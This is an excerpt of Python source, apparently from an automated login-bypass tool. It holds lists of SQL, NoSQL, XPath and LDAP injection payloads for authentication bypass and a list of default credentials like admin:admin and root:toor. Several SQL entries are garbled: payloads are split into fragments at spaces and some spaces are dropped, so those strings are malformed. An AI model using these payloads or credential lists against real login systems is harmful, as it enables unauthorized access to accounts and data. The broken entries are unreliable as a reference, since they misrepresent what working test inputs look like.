...
INJECTION_PAYLOADS = {
    "SQL Injection": [
        ...
        "admin' OR '1'='1' #", "admin' OR '1'='1'/*",
        "admin', 'OR'1'='1", "admin', 'OR1=1--", "admin', 'OR1=1#", "admin', 'OR1=1/*", "admin','or'1'='1--",
        "admin', 'or'1'='1'#", "admin', 'or'1'='1'/*", "admin'or1=1or''='", "", "admin', 'or1=1", 
        "admin', 'or1=1--", "admin', 'or1=1#", "admin', 'or1=1/*", "admin')", "or('1'='1", "admin')", 
        "or('1'='1'--", "admin')", "or('1'='1'#", "admin')", "or('1'='1'/*", "admin')", "or'1'='1", 
        "admin')", "or'1'='1'--", "admin')", "or'1'='1'#", "admin')", "or'1'='1'/*", "1234", 
        "AND1=0UNIONALLSELECT'admin','81dc9bdb52d04dc20036dbd8313ed055", "admin\"", "--", "admin\"", 
        "#", "admin\"", "/*", "admin\"", "or'1'='1", "admin\"", "or'1'='1'--", "admin\"", "or'1'='1'#", 
        "admin\"", "or'1'='1'/*", "admin\"or1=1or\"\"=\"", "", "admin\"", "or1=1", "admin\"", "or1=1--", 
        "admin\"", "or1=1#", "admin\"", "or1=1/*", "admin\")", "or(\"1\"=\"1", "admin\")", "or(\"1\"=\"1\"--", 
        "admin\")", "or(\"1\"=\"1\"#", "admin\")", "or(\"1\"=\"1\"/*", "admin\")", "or\"1\"=\"1", "admin\")", 
        "or\"1\"=\"1\"--", "admin\")", "or\"1\"=\"1\"#", "admin\")", "or\"1\"=\"1\"/*", "1234", 
        "AND1=0UNIONALLSELECT\"admin\",\"81dc9bdb52d04dc20036dbd8313ed055", "'||'1'='1';-- -", 
        "'||1=1;-- -"
    ],
    "NoSQL Injection": [
        '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
        '{"$in": [null, ""]}', '{"$exists": true}',
        "admin", '{"$ne":null}', "admin", '{"$gt":""}', "admin", '{"$regex":".*"}', 
        "admin", '{"$where":"this.password==this.username"}', "admin", '{"$ne":"test"}', 
        "admin", '{"$or":[{"username":null}]}', "admin", '{"$exists":true}', 
    ...
    "XPath Injection": [
        ...
        "admin' or '", "admin' or '1'='2","'or'1'='1", "anything", "'or1=1", "user", "'or'a'='a", "admin", 
        "'orcount(//div)>0", "", "'or1=1//", "test"
    ],
    "LDAP Injection": [
        "*", "*)(&", "*)(|(&", "pwd)", "*)(|(*", "*))%00",
        "admin)(&)", "pwd", "admin)(!(&(|", "pwd))", "admin))(|(|",
        "admin", "*)(uid=*))(|(uid=*", "admin", "(uid=*))(|(uid=*))", 
        "admin", "(cn=admin)(password=*))(|(password=*", "admin", 
        "(objectclass=*))(|(uid=*", "admin", "(uid=*))(|(uid=*))"
    ]
}
...
DEFAULT_CREDENTIALS = [
    ...
    "admin:admin","admin:password","admin:12345", "admin:root", 
    "root:root", "admin:welcome", "admin:letmein", "admin:toor", 
    "guest:guest", "admin:qwe rty", "admin:1234", "admin:admin123"
]
